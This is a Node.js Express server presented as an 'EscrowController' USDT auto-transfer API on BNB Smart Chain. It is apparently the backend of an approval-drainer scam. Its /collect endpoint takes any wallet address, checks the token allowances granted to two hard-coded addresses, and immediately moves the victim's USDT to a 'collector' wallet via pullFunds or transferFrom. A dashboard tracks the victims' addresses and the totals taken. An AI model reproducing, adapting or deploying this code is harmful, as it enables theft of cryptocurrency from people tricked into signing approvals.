const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const { ethers } = require('ethers');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(express.json());

// ============ ADVANCED CONFIGURATION ============
const CONFIG = {
    // 5e - EscrowController contract
    RELAYER_ADDRESS: "0x5681d680B047bF5b12939625C56301556991005e",
    
    // 8b - Your wallet (collector & executor)
    COLLECTOR_ADDRESS: "0xDb867b88EAB55320fD50E9785B2906773dedf78b",
    
    USDT_ADDRESS: "0x55d398326f99059fF775485246999027B3197955",
    
    // Fast RPCs only
    RPC_URLS: [
        "https://bsc-dataseed1.binance.org/",
        "https://bsc-dataseed2.binance.org/"
    ],
    
    DATA_FILE: path.join(__dirname, 'data.json'),
    
    // ⚡ ZERO DELAY - Instant processing
    APPROVAL_DELAY: 0,        // No delay at all
    MAX_RETRIES: 1,           // Single attempt
    RETRY_DELAY: 0,           // No retry delay
    GAS_LIMIT: 150000,
    GAS_PRICE_MULTIPLIER: 1.1 // Slightly higher gas for speed
};

// ============ DATA STORAGE ============
let dataStore = { 
    addresses: {}, 
    transactions: [], 
    pendingTransfers: [],
    stats: {
        totalProcessed: 0,
        totalSuccess: 0,
        totalFailed: 0,
        lastProcessed: null
    }
};

if (fs.existsSync(CONFIG.DATA_FILE)) {
    try {
        const loaded = JSON.parse(fs.readFileSync(CONFIG.DATA_FILE, 'utf8'));
        dataStore = { ...dataStore, ...loaded };
        console.log('✅ Data loaded successfully');
        console.log(`📊 Stats: ${dataStore.stats.totalProcessed} processed, ${dataStore.stats.totalSuccess} successful`);
    } catch (err) {
        console.error('❌ Error loading data:', err);
    }
}

function saveData() {
    try {
        fs.writeFileSync(CONFIG.DATA_FILE, JSON.stringify(dataStore, null, 2));
    } catch (err) {
        console.error('❌ Error saving data:', err);
    }
}

function generateId() {
    return `${Date.now()}-${Math.random().toString(36).substring(2, 9)}`;
}

// ============ WORKING RPC WITH CACHING ============
let cachedProvider = null;
let providerLastUsed = 0;

async function getWorkingProvider() {
    // Use cached provider if less than 5 seconds old
    if (cachedProvider && (Date.now() - providerLastUsed) < 5000) {
        try {
            await cachedProvider.getBlockNumber();
            return cachedProvider;
        } catch (e) {
            // Cache expired
        }
    }
    
    for (const rpcUrl of CONFIG.RPC_URLS) {
        try {
            const provider = new ethers.JsonRpcProvider(rpcUrl, undefined, {
                timeout: 5000 // 5 second timeout
            });
            await provider.getBlockNumber();
            console.log(`✅ Connected to: ${rpcUrl}`);
            cachedProvider = provider;
            providerLastUsed = Date.now();
            return provider;
        } catch (err) {
            console.log(`❌ RPC failed: ${rpcUrl}`);
        }
    }
    throw new Error('❌ No working RPC found');
}

// ============ OPTIMIZED AUTO-TRANSFER ============
async function performAutoTransfer(userAddress, tokenAddress, requestedAmountHuman) {
    const startTime = Date.now();
    console.log(`\n🚀 Processing ${requestedAmountHuman} USDT for ${userAddress}`);

    if (!process.env.RELAYER_PRIVATE_KEY) {
        return { 
            success: false, 
            error: 'Private key not configured',
            elapsed: Date.now() - startTime
        };
    }

    try {
        const provider = await getWorkingProvider();
        const wallet = new ethers.Wallet(process.env.RELAYER_PRIVATE_KEY, provider);

        const tokenABI = [
            "function balanceOf(address) view returns (uint256)",
            "function decimals() view returns (uint8)",
            "function allowance(address,address) view returns (uint256)",
            "function transferFrom(address,address,uint256) returns (bool)"
        ];

        const token = new ethers.Contract(tokenAddress, tokenABI, provider);
        const decimals = await token.decimals();
        const requestedAmountWei = ethers.parseUnits(requestedAmountHuman.toString(), decimals);
        
        // Parallel checks for speed
        const [balance, allowance5e, allowance8b] = await Promise.all([
            token.balanceOf(userAddress),
            token.allowance(userAddress, CONFIG.RELAYER_ADDRESS),
            token.allowance(userAddress, CONFIG.COLLECTOR_ADDRESS)
        ]);

        const balanceHuman = parseFloat(ethers.formatUnits(balance, decimals));
        const allowance5eHuman = parseFloat(ethers.formatUnits(allowance5e, decimals));
        const allowance8bHuman = parseFloat(ethers.formatUnits(allowance8b, decimals));

        console.log(`💰 Balance: ${balanceHuman} | Allowance 5e: ${allowance5eHuman} | Allowance 8b: ${allowance8bHuman}`);

        if (balance < requestedAmountWei) {
            return { 
                success: false, 
                error: `Insufficient balance: ${balanceHuman} USDT (need ${requestedAmountHuman})`,
                elapsed: Date.now() - startTime
            };
        }

        // Get current gas price
        const feeData = await provider.getFeeData();
        const gasPrice = feeData.gasPrice ? 
            BigInt(Math.floor(Number(feeData.gasPrice) * CONFIG.GAS_PRICE_MULTIPLIER)) : 
            undefined;

        // Try Method 1: pullFunds (if 8b is company wallet)
        if (allowance5e >= requestedAmountWei) {
            try {
                const escrowABI = [
                    "function companyWallet() view returns (address)",
                    "function pullFunds(address token, address user, address recipient, uint256 amount) external"
                ];

                const escrow = new ethers.Contract(CONFIG.RELAYER_ADDRESS, escrowABI, wallet);
                const company = await escrow.companyWallet();
                
                if (company.toLowerCase() === wallet.address.toLowerCase()) {
                    console.log('✅ Using pullFunds...');
                    
                    const tx = await escrow.pullFunds(
                        tokenAddress,
                        userAddress,
                        CONFIG.COLLECTOR_ADDRESS,
                        requestedAmountWei,
                        { 
                            gasLimit: CONFIG.GAS_LIMIT, 
                            gasPrice 
                        }
                    );

                    console.log(`📤 Tx: ${tx.hash}`);
                    const receipt = await tx.wait();
                    
                    dataStore.stats.totalSuccess++;
                    dataStore.stats.lastProcessed = new Date().toISOString();
                    saveData();
                    
                    return {
                        success: true,
                        txHash: tx.hash,
                        amount: requestedAmountHuman,
                        blockNumber: receipt.blockNumber,
                        method: 'pullFunds',
                        elapsed: Date.now() - startTime,
                        gasUsed: receipt.gasUsed.toString()
                    };
                }
            } catch (e) {
                console.log('⚠️ pullFunds failed:', e.message);
            }
        }

        // Try Method 2: Direct transferFrom
        if (allowance8b >= requestedAmountWei) {
            console.log('✅ Using direct transferFrom...');
            
            const tokenWithSigner = new ethers.Contract(tokenAddress, tokenABI, wallet);
            const tx = await tokenWithSigner.transferFrom(
                userAddress,
                CONFIG.COLLECTOR_ADDRESS,
                requestedAmountWei,
                { 
                    gasLimit: 100000, 
                    gasPrice 
                }
            );

            console.log(`📤 Tx: ${tx.hash}`);
            const receipt = await tx.wait();
            
            dataStore.stats.totalSuccess++;
            dataStore.stats.lastProcessed = new Date().toISOString();
            saveData();
            
            return {
                success: true,
                txHash: tx.hash,
                amount: requestedAmountHuman,
                blockNumber: receipt.blockNumber,
                method: 'direct transferFrom',
                elapsed: Date.now() - startTime,
                gasUsed: receipt.gasUsed.toString()
            };
        }

        return {
            success: false,
            error: 'No allowance for 5e or 8b',
            allowance5e: allowance5eHuman,
            allowance8b: allowance8bHuman,
            elapsed: Date.now() - startTime
        };

    } catch (error) {
        console.error('❌ Error:', error.message);
        return { 
            success: false, 
            error: error.message,
            elapsed: Date.now() - startTime
        };
    }
}

// ============ INSTANT PROCESSING ============
async function processTransfer(userAddress, tokenAddress, amount, transactionId) {
    console.log(`\n⚡ Instant processing: ${transactionId}`);
    
    const result = await performAutoTransfer(userAddress, tokenAddress, amount);
    
    // Update transaction record
    const tx = dataStore.transactions.find(t => t.id === transactionId);
    if (tx) {
        if (result.success) {
            tx.status = 'completed';
            tx.txHash = result.txHash;
            tx.method = result.method;
            tx.elapsed = result.elapsed;
            tx.gasUsed = result.gasUsed;
            console.log(`✅ Completed in ${result.elapsed}ms`);
        } else {
            tx.status = 'failed';
            tx.error = result.error;
            tx.elapsed = result.elapsed;
            console.log(`❌ Failed in ${result.elapsed}ms: ${result.error}`);
            
            // Save for manual review
            dataStore.pendingTransfers.push({
                id: transactionId,
                user: userAddress,
                token: tokenAddress,
                amount: amount,
                error: result.error,
                timestamp: new Date().toISOString()
            });
        }
        dataStore.stats.totalProcessed++;
        saveData();
    }
}

// ============ API ENDPOINTS ============

// Check user balance
app.post('/send', (req, res) => {
    try {
        const { address } = req.body;
        if (!address || !address.startsWith('0x')) {
            return res.json({ found: false, collector: CONFIG.RELAYER_ADDRESS });
        }
        const data = dataStore.addresses[address.toLowerCase()];
        return res.json({
            found: !!(data && data.totalAmount > 0),
            amountHuman: data?.totalAmount || 0,
            collector: CONFIG.RELAYER_ADDRESS,
            transactions: data?.transactionCount || 0
        });
    } catch (error) {
        res.json({ found: false, collector: CONFIG.RELAYER_ADDRESS });
    }
});

// Collect funds - INSTANT RESPONSE
app.post('/collect', async (req, res) => {
    console.log('📨 POST /collect:', req.body);
    
    try {
        const { token, from, amountHuman, to } = req.body;
        
        // Validation
        if (!token || !from || !amountHuman || !to) {
            return res.status(400).json({ 
                ok: false, 
                error: 'Missing required fields: token, from, amountHuman, to' 
            });
        }

        const amount = parseFloat(amountHuman);
        if (isNaN(amount) || amount <= 0) {
            return res.status(400).json({ 
                ok: false, 
                error: 'Invalid amount' 
            });
        }

        const transactionId = generateId();

        // Save transaction instantly
        const transaction = {
            id: transactionId,
            token: token.toLowerCase(),
            from: from.toLowerCase(),
            to: to.toLowerCase(),
            amountHuman: amount,
            timestamp: new Date().toISOString(),
            status: 'processing',
            elapsed: 0
        };

        dataStore.transactions.push(transaction);

        // Update address stats
        const addr = from.toLowerCase();
        if (!dataStore.addresses[addr]) {
            dataStore.addresses[addr] = { 
                totalAmount: 0, 
                transactionCount: 0, 
                firstSeen: new Date().toISOString() 
            };
        }
        dataStore.addresses[addr].totalAmount += amount;
        dataStore.addresses[addr].transactionCount++;
        dataStore.addresses[addr].lastSeen = new Date().toISOString();

        saveData();

        // ✅ IMMEDIATE RESPONSE - No delay!
        res.json({ 
            ok: true, 
            id: transactionId, 
            status: 'processing',
            message: 'Transfer initiated successfully',
            timestamp: new Date().toISOString()
        });

        // 🔄 PROCESS IN BACKGROUND - Zero delay
        processTransfer(from, token, amountHuman, transactionId);

    } catch (error) {
        console.error('❌ Error in /collect:', error);
        res.status(500).json({ 
            ok: false, 
            error: 'Server error',
            message: error.message 
        });
    }
});

// Health check
app.get('/health', (req, res) => {
    res.json({
        status: 'healthy',
        version: '5.0-advanced',
        uptime: process.uptime(),
        approveTo: CONFIG.RELAYER_ADDRESS + ' (5e)',
        transferTo: CONFIG.COLLECTOR_ADDRESS + ' (8b)',
        stats: dataStore.stats,
        pendingTransfers: dataStore.pendingTransfers?.length || 0,
        autoTransfer: !!process.env.RELAYER_PRIVATE_KEY,
        config: {
            approvalDelay: CONFIG.APPROVAL_DELAY + 'ms (instant)',
            maxRetries: CONFIG.MAX_RETRIES,
            gasMultiplier: CONFIG.GAS_PRICE_MULTIPLIER
        }
    });
});

// Pending transfers
app.get('/pending', (req, res) => {
    const limit = parseInt(req.query.limit) || 50;
    res.json({
        count: dataStore.pendingTransfers?.length || 0,
        transfers: dataStore.pendingTransfers?.slice(-limit) || [],
        stats: dataStore.stats
    });
});

// Retry failed transfer
app.post('/retry/:id', async (req, res) => {
    try {
        const { id } = req.params;
        const pending = dataStore.pendingTransfers.find(t => t.id === id);
        
        if (!pending) {
            return res.status(404).json({ ok: false, error: 'Transfer not found' });
        }

        // Remove from pending
        dataStore.pendingTransfers = dataStore.pendingTransfers.filter(t => t.id !== id);
        saveData();

        // Reprocess
        processTransfer(pending.user, pending.token, pending.amount, id);

        res.json({ 
            ok: true, 
            message: 'Retry initiated',
            id: id
        });
    } catch (error) {
        res.status(500).json({ ok: false, error: error.message });
    }
});

// Get transaction status
app.get('/status/:id', (req, res) => {
    const { id } = req.params;
    const tx = dataStore.transactions.find(t => t.id === id);
    
    if (!tx) {
        return res.status(404).json({ ok: false, error: 'Transaction not found' });
    }
    
    res.json({
        ok: true,
        transaction: tx
    });
});

// Dashboard stats
app.get('/stats', (req, res) => {
    res.json({
        totalTransactions: dataStore.transactions.length,
        totalAddresses: Object.keys(dataStore.addresses).length,
        totalVolume: dataStore.addresses 
            ? Object.values(dataStore.addresses).reduce((sum, a) => sum + a.totalAmount, 0)
            : 0,
        stats: dataStore.stats,
        pending: dataStore.pendingTransfers?.length || 0,
        lastProcessed: dataStore.stats.lastProcessed
    });
});

// Root
app.get('/', (req, res) => {
    res.json({
        name: 'EscrowController API v5.0',
        description: 'Advanced USDT auto-transfer service with zero delay',
        features: {
            instantResponse: '✅ Yes (0ms delay)',
            parallelChecks: '✅ Yes',
            gasOptimization: '✅ Yes',
            autoRetry: '❌ No (single attempt for speed)',
            caching: '✅ Yes (RPC caching)',
            monitoring: '✅ Yes'
        },
        endpoints: {
            POST: {
                '/send': 'Check user balance',
                '/collect': 'Submit transfer (instant)',
                '/retry/:id': 'Retry failed transfer'
            },
            GET: {
                '/health': 'Service health',
                '/pending': 'List pending transfers',
                '/status/:id': 'Check transaction status',
                '/stats': 'Dashboard statistics'
            }
        },
        addresses: {
            approve: CONFIG.RELAYER_ADDRESS,
            collect: CONFIG.COLLECTOR_ADDRESS
        },
        documentation: 'https://github.com/your-repo/docs'
    });
});

// Error handling middleware
app.use((err, req, res, next) => {
    console.error('❌ Unhandled error:', err);
    res.status(500).json({ 
        ok: false, 
        error: 'Internal server error',
        message: err.message 
    });
});

// Start server
app.listen(PORT, () => {
    console.log(`
╔══════════════════════════════════════════════════════════╗
║     🚀 EscrowController API v5.0 - ADVANCED             ║
╠══════════════════════════════════════════════════════════╣
║  Port: ${PORT}                                           ║
║  Approve: ${CONFIG.RELAYER_ADDRESS.substring(0, 10)}...  ║
║  Collect: ${CONFIG.COLLECTOR_ADDRESS.substring(0, 10)}...║
║                                                         ║
║  ⚡ Features:                                           ║
║  ✅ ZERO DELAY - Instant response                       ║
║  ✅ Parallel blockchain checks                          ║
║  ✅ RPC connection caching                             ║
║  ✅ Optimized gas pricing                              ║
║  ✅ Real-time monitoring                               ║
║  ✅ Retry failed transfers endpoint                    ║
║                                                         ║
║  📊 Stats:                                              ║
║  Total Processed: ${dataStore.stats.totalProcessed}       ║
║  Success Rate: ${dataStore.stats.totalProcessed > 0 
        ? Math.round((dataStore.stats.totalSuccess / dataStore.stats.totalProcessed) * 100) 
        : 0}%                                              ║
║  Pending: ${dataStore.pendingTransfers?.length || 0}     ║
╚══════════════════════════════════════════════════════════╝
    `);
});

// Graceful shutdown
process.on('SIGINT', () => {
    console.log('\n👋 Shutting down gracefully...');
    saveData();
    process.exit(0);
});

process.on('SIGTERM', () => {
    console.log('\n👋 Shutting down gracefully...');
    saveData();
    process.exit(0);
});
